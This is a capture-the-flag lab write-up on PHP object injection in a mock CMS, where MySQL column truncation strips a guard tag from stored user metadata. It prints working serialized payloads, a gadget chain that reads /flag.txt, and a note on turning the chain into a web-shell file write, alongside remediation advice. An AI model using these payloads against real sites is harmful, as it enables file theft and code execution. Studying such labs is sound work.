# 07 — A Pile of Poo in the usermeta Table — Writeup

## TL;DR

`inkpress` stores scalars in `usermeta.meta_value` with a `|r7` revision tag
glued to the end, so that WordPress-style `maybe_unserialize()` refuses them:
strict `is_serialized()` requires the value to end in `;` or `}`. MySQL runs
with `sql_mode = ''`, and `meta_value` is `VARCHAR(255) CHARACTER SET utf8`
(three bytes per character). Either overflowing 255 characters or embedding
U+1F4A9 makes the server silently drop the tail of the value — including the
tag. What is left in the column is a complete, attacker-controlled `O:` blob,
which the next read hands straight to `unserialize()`.

Chain: `ActivityLog::__destruct()` → string cast → `MediaItem::__toString()` →
`file_get_contents('/flag.txt')` → base64 → the activity log page.

Flag: `PHRACK{a_pile_of_poo_truncated_my_usermeta}`.

## The bug

### 1. Everything that "looks serialized" gets woken up

`challenge/src/meta.php` reimplements the WordPress metadata pair. Reads go
through:

```php
function maybe_unserialize($value)
{
    if (is_string($value) && looks_serialized($value)) {
        return @unserialize($value);
    }
    return $value;
}
```

`looks_serialized()` is modelled on WordPress' `is_serialized()`. The
security-relevant part is not the type regex, it is this:

```php
if ($strict) {
    $last = $data[strlen($data) - 1];
    if ($last !== ';' && $last !== '}') {
        return false;
    }
}
```

The decision to call `unserialize()` on database content is taken by looking at
**one byte**: the last one.

### 2. The vendor's fix targets that byte

```php
function update_user_meta(int $uid, string $key, $value): void
{
    $stored = maybe_serialize($value);
    if (is_string($value)) {
        $stored .= META_REVISION_TAG;   // '|r7'
    }
    ...
}
```

Arrays and objects are serialized and stored verbatim (they have to survive the
round trip). Scalars — the only thing a user controls directly — get a tag
appended. A tagged value ends in `7`, so `looks_serialized()` returns false and
the string comes back as a string. The read path strips the tag *after* the
`maybe_unserialize()` call, which is the ordering mistake that makes the whole
thing exploitable once the tag is gone.

This defence is exactly as strong as the guarantee "the bytes I wrote are the
bytes that will be stored".

### 3. The storage layer does not offer that guarantee

`docker-compose.yml` starts MySQL with `--sql-mode=`. With no
`STRICT_TRANS_TABLES`, a value that does not fit a column is not an error: the
server *adjusts* it, raises a warning, and commits. `challenge/db/01-schema.sql`
gives it two ways to do that:

```sql
meta_value VARCHAR(255) CHARACTER SET utf8 NULL
```

* **length** — more than 255 characters: warning 1265 `Data truncated`, the
  first 255 characters are stored;
* **charset** — MySQL's `utf8` is `utf8mb3`, three bytes per character. The
  connection charset is also `utf8` (`$db->set_charset('utf8')` — WordPress did
  not switch to `utf8mb4` until 4.2), so a 4-byte sequence such as
  `f0 9f 92 a9` (U+1F4A9 PILE OF POO) is not a valid character *for the declared
  connection charset at all*. MySQL emits warning 1300 `Invalid utf8 character
  string` plus 1366 `Incorrect string value` and **keeps only the bytes in front
  of it**.

Both are suffix deletions, which is precisely what is needed: `unserialize()`
parses one value from the start of the buffer and ignores whatever follows, so
an attacker only ever needs their object to be a *prefix* of the stored value.

### 4. The gadgets

`challenge/src/gadgets.php`:

```php
class MediaItem  { public $path; public $alt = 'image';
    public function __toString() { return '[' . $this->alt . '] '
        . base64_encode((string) @file_get_contents($this->path)); } }

class ActivityLog { public $entries = []; public $sink = null;
    public function __destruct() { /* string-casts every entry, appends to a log */ } }
```

Neither is dangerous alone. `ActivityLog::__destruct()` concatenates `$entries`,
which triggers `MediaItem::__toString()`, which reads an arbitrary file. Two
hops, no `eval`, no `system`.

## Building the exploit

### Step 1 — the object

```
O:11:"ActivityLog":2:{
  s:7:"entries";a:1:{i:0;O:9:"MediaItem":2:{s:4:"path";s:9:"/flag.txt";s:3:"alt";s:12:"poo-1a2b3c4d";}}
  s:4:"sink";N;
}
```

`sink` is left `N;` so the destructor falls back to the application's own log
file (`$this->sink ?: ACTIVITY_LOG`, i.e. `/var/inkpress/activity.log` — outside
the document root, so the only way to read it is `activity.php`). Setting it
instead gives a bonus arbitrary-file-write primitive — see *Going further*.

### Step 2a — the 4-byte character variant

Submit as `bio`:

```
O:11:"ActivityLog":2:{s:7:"entries";a:1:{i:0;O:9:"MediaItem":2:{s:4:"path";s:9:"/flag.txt";s:3:"alt";s:12:"poo-1a2b3c4d";}}s:4:"sink";N;}💩 everything from the poo onwards is dropped by MySQL
```

The application stores `<payload>|r7`. MySQL stores only the 137 characters
before the emoji. Measured directly against the lab's server:

```
mysql> SET sql_mode='';
mysql> CREATE TABLE x(v VARCHAR(255) CHARACTER SET utf8);
mysql> INSERT INTO x VALUES ('HEAD}<U+1F4A9>TAIL');
Warning 1300  Invalid utf8 character string: 'F09F92'
Warning 1366  Incorrect string value: '\xF0\x9F\x92\xA9TA...' for column 'v' at row 1
mysql> SELECT v, HEX(v), CHAR_LENGTH(v) FROM x;
+-------+--------------+----------------+
| HEAD} | 484541447D   |              5 |
+-------+--------------+----------------+
```

No padding, no arithmetic: the cut lands wherever you put the emoji.

### Step 2b — the length-overflow variant

Here the cut lands at character 255, so the object has to be *exactly* 255
characters long. `solve/solve.py` pads the `alt` property until it is:

```
O:11:"ActivityLog":2:{s:7:"entries";a:1:{i:0;O:9:"MediaItem":2:{s:4:"path";s:9:"/flag.txt";s:3:"alt";s:129:"len-1a2b3c4d-AAAA...AAAA";}}s:4:"sink";N;}   <- exactly 255 chars
```

followed by any tail at all. `<payload> + tail + "|r7"` is longer than 255, so
the column keeps exactly the payload.

### Step 3 — trigger and collect

Any subsequent read of the `bio` meta key runs `maybe_unserialize()`. The
destructor fires at request shutdown and appends

```
[poo-1a2b3c4d] UEhSQUNLe2FfcGlsZV9vZl9wb29fdHJ1bmNhdGVkX215X3VzZXJtZXRhfQo=
```

to `ACTIVITY_LOG` (`/var/inkpress/activity.log`, deliberately outside the
document root), which `activity.php` renders. Base64-decode it.

The `1a2b3c4d` is a per-run nonce that `solve/solve.py` appends to both
variants' labels. The log is append-only, so without it a second run would
happily harvest the *first* run's blobs and report both variants as working
even if one of them had stopped truncating.

## The exploit

`solve/solve.py`, Python 3 standard library only, runs **both** variants and
fails unless both work:

1. `build_object(alt)` assembles the `ActivityLog`/`MediaItem` graph by hand
   (`php_str()` emits `s:<len>:"..."`).
2. `build_object_of_length(255, b"len-<nonce>-")` pads `alt` until
   `len(obj) == 255`, for the length-overflow variant.
3. `run_variant()` POSTs the payload to `/index.php`, re-reads the page (which
   is what actually calls `maybe_unserialize()`), then scrapes `/activity.php`
   for the base64 blob logged under that variant's `alt` label — which carries
   this run's nonce, so only a blob this run produced can satisfy it.
4. The flag from the emoji variant is printed last as `FLAG: PHRACK{...}`.

```
[=] length truncation : OK
[=] emoji truncation  : OK
FLAG: PHRACK{a_pile_of_poo_truncated_my_usermeta}
```

## Fixing it

* **Do not decide "is this serialized?" by sniffing the data.** Store the type
  next to the value (a `meta_type` column, or a JSON envelope), or store JSON
  and use `json_decode($v, true)`, which cannot instantiate objects.
* If you must keep an `unserialize()` call, pass
  `unserialize($v, ['allowed_classes' => false])`. Nothing in this lab needs
  objects out of the metadata table.
* **Make the database reject what it cannot store**: `sql_mode` must contain
  `STRICT_TRANS_TABLES` (MySQL 5.7+/8.0 default). The insert then fails loudly
  instead of storing a shortened value.
* Move the schema to `utf8mb4` *and* the connection to `utf8mb4`, so a 4-byte
  character is simply stored.
* Check `mysqli::$warning_count` after writes. The two truncations in this lab
  both raise warnings that the application throws away.
* Do not build a security control out of a value's last byte, and never strip a
  trust marker *after* you have already parsed the value.

## Going further

* `ActivityLog::$sink` is attacker-controlled. Point it at
  `/var/www/html/shell.php` and the same chain becomes an arbitrary file write —
  the `MediaItem` string cast even lets you control part of the content. Harden
  the lab by making `$sink` private/const if you want to keep it read-only.
* `meta_key` is `VARCHAR(64)` and truncates too. Classic Stefan Esser: register
  a key that truncates onto somebody else's row and overwrite their metadata.
* The article's section 2.1 ("Serialize, Replace, Then Pwn") is the mirror
  image: instead of *deleting* a suffix, the application *substitutes* inside
  the blob so that a declared string length swallows the following fields
  (0CTF 2016 `piapiapia`, Rusty Joomla).
* Reference [22] (WordPress < 5.8.3) is the asymmetric-interface version of the
  same idea: the value is serialized once on the way in and twice on the way
  out.

### Honest note on MariaDB

The lab uses **MySQL 5.7.44** rather than MariaDB on purpose. Measured on this
machine with `sql_mode=''`, a `utf8` connection and a `VARCHAR(255) CHARACTER
SET utf8` column, inserting `HEAD}` + U+1F4A9 + `TAIL`:

| server         | stored value    | behaviour                    |
|----------------|-----------------|------------------------------|
| mysql:5.6      | `HEAD}`         | truncates at the 4-byte char |
| mysql:5.7.44   | `HEAD}`         | truncates at the 4-byte char |
| mariadb:10.3   | `HEAD}????TAIL` | substitutes `?` per byte     |
| mariadb:10.11  | `HEAD}????TAIL` | substitutes `?` per byte     |

MariaDB replaces unconvertible characters instead of truncating, so the emoji
variant does **not** work there. The length-overflow variant works on both
(verified on mariadb:10.11 during development). If you port this lab to MariaDB,
the emoji stage becomes documentation only.

## References

* Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*, Phrack
  #72, chapter 2 — "One `unserialize()` to Rule Them All".
* Stefan Esser, *MySQL and SQL Column Truncation Vulnerabilities*, 2008 —
  `http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities/`
  (archived).
* Tom Van Goethem, *WordPress <= 3.6.1 PHP Object Injection*, 2013 —
  <https://tom.vg/2013/09/wordpress-php-object-injection/>
* Simon Scannell (Sonar), *WordPress < 5.8.3 Object Injection* —
  <https://www.sonarsource.com/blog/wordpress-object-injection-vulnerability/>
* WordPress source for `is_serialized()` / `maybe_unserialize()` —
  <https://developer.wordpress.org/reference/functions/is_serialized/>
* MySQL manual, *Server SQL Modes* —
  <https://dev.mysql.com/doc/refman/5.7/en/sql-mode.html>
